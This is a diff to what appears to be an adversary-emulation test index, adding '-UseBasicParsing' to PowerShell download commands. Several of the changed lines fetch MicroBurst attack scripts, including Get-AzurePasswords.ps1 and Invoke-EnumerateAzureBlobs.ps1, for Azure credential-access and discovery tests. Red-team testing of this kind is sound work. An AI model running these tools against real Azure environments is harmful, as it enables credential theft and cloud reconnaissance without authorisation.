@@ -8172,7 +8172,7 @@ stealth:
 
           '
         get_prereq_command: "$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest
-          -Uri https://aka.ms/installazurecliwindowsx64 -OutFile .\\AzureCLI.msi;
+          -Uri https://aka.ms/installazurecliwindowsx64 -OutFile .\\AzureCLI.msi -UseBasicParsing;
           Start-Process msiexec.exe -Wait -ArgumentList '/I AzureCLI.msi /quiet';
           Remove-Item .\\AzureCLI.msi\n"
       - description: 'Check if the user is logged into Azure.
@@ -15478,7 +15478,7 @@ privilege-escalation:
 
           '
         get_prereq_command: "$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest
-          -Uri https://aka.ms/installazurecliwindowsx64 -OutFile .\\AzureCLI.msi;
+          -Uri https://aka.ms/installazurecliwindowsx64 -OutFile .\\AzureCLI.msi -UseBasicParsing;
           Start-Process msiexec.exe -Wait -ArgumentList '/I AzureCLI.msi /quiet';
           Remove-Item .\\AzureCLI.msi\n"
       - description: 'Check if the user is logged into Azure.
@@ -27084,7 +27084,7 @@ persistence:
 
           '
         get_prereq_command: "$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest
-          -Uri https://aka.ms/installazurecliwindowsx64 -OutFile .\\AzureCLI.msi;
+          -Uri https://aka.ms/installazurecliwindowsx64 -OutFile .\\AzureCLI.msi -UseBasicParsing;
           Start-Process msiexec.exe -Wait -ArgumentList '/I AzureCLI.msi /quiet';
           Remove-Item .\\AzureCLI.msi\n"
       - description: 'Check if the user is logged into Azure.
@@ -41370,7 +41370,7 @@ credential-access:
           '
         get_prereq_command: |
           New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
-          invoke-webrequest "https://raw.githubusercontent.com/NetSPI/MicroBurst/c771c665a2c71f9c5ba474869cd1c211ebee68fd/AzureRM/Get-AzurePasswords.ps1" -outfile "PathToAtomicsFolder\..\ExternalPayloads\Get-AzurePasswords.ps1"
+          invoke-webrequest "https://raw.githubusercontent.com/NetSPI/MicroBurst/c771c665a2c71f9c5ba474869cd1c211ebee68fd/AzureRM/Get-AzurePasswords.ps1" -outfile "PathToAtomicsFolder\..\ExternalPayloads\Get-AzurePasswords.ps1" -UseBasicParsing
       - description: 'The Azure RM module must be installed.
 
           '
@@ -44125,7 +44125,7 @@ discovery:
           default:
       executor:
         command: |
-          try{$response = invoke-webrequest "https://#{base_name}.blob.core.windows.net/#{container_name}/#{blob_name}" -method "GET"}
+          try{$response = invoke-webrequest "https://#{base_name}.blob.core.windows.net/#{container_name}/#{blob_name}" -method "GET" -UseBasicParsing}
           catch [system.net.webexception]
           {if($_.Exception.Response -ne $null)
           {$Response = $_.Exception.Response.GetResponseStream()
@@ -44170,7 +44170,7 @@ discovery:
           '
         get_prereq_command: |
           New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
-          invoke-webrequest "https://raw.githubusercontent.com/NetSPI/MicroBurst/156c4e9f4253b482b2b68eda4651116b9f0f2e17/Misc/Invoke-EnumerateAzureBlobs.ps1" -outfile "PathToAtomicsFolder\..\ExternalPayloads\Invoke-EnumerateAzureBlobs.ps1"
+          invoke-webrequest "https://raw.githubusercontent.com/NetSPI/MicroBurst/156c4e9f4253b482b2b68eda4651116b9f0f2e17/Misc/Invoke-EnumerateAzureBlobs.ps1" -outfile "PathToAtomicsFolder\..\ExternalPayloads\Invoke-EnumerateAzureBlobs.ps1" -UseBasicParsing
       - description: 'The wordlist file for search permutations must exist in PathToAtomicsFolder\..\ExternalPayloads.
 
           '
@@ -44178,7 +44178,7 @@ discovery:
 
           '
         get_prereq_command: 'invoke-webrequest "https://raw.githubusercontent.com/NetSPI/MicroBurst/156c4e9f4253b482b2b68eda4651116b9f0f2e17/Misc/permutations.txt"
-          -outfile "#{wordlist}"
+          -outfile "#{wordlist}" -UseBasicParsing
 
           '
       executor:
@@ -44871,7 +44871,7 @@ discovery:
           '
         get_prereq_command: |
           New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
-          invoke-webrequest "https://raw.githubusercontent.com/NetSPI/MicroBurst/c771c665a2c71f9c5ba474869cd1c211ebee68fd/Az/Get-AzDomainInfo.ps1" -outfile "PathToAtomicsFolder\..\ExternalPayloads\Get-AzDomainInfo.ps1"
+          invoke-webrequest "https://raw.githubusercontent.com/NetSPI/MicroBurst/c771c665a2c71f9c5ba474869cd1c211ebee68fd/Az/Get-AzDomainInfo.ps1" -outfile "PathToAtomicsFolder\..\ExternalPayloads\Get-AzDomainInfo.ps1" -UseBasicParsing
       - description: 'The Az module must be installed.
 
           '
@@ -54104,7 +54104,7 @@ initial-access:
 
           '
         get_prereq_command: "$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest
-          -Uri https://aka.ms/installazurecliwindowsx64 -OutFile .\\AzureCLI.msi;
+          -Uri https://aka.ms/installazurecliwindowsx64 -OutFile .\\AzureCLI.msi -UseBasicParsing;
           Start-Process msiexec.exe -Wait -ArgumentList '/I AzureCLI.msi /quiet';
           Remove-Item .\\AzureCLI.msi\n"
       - description: 'Check if the user is logged into Azure.
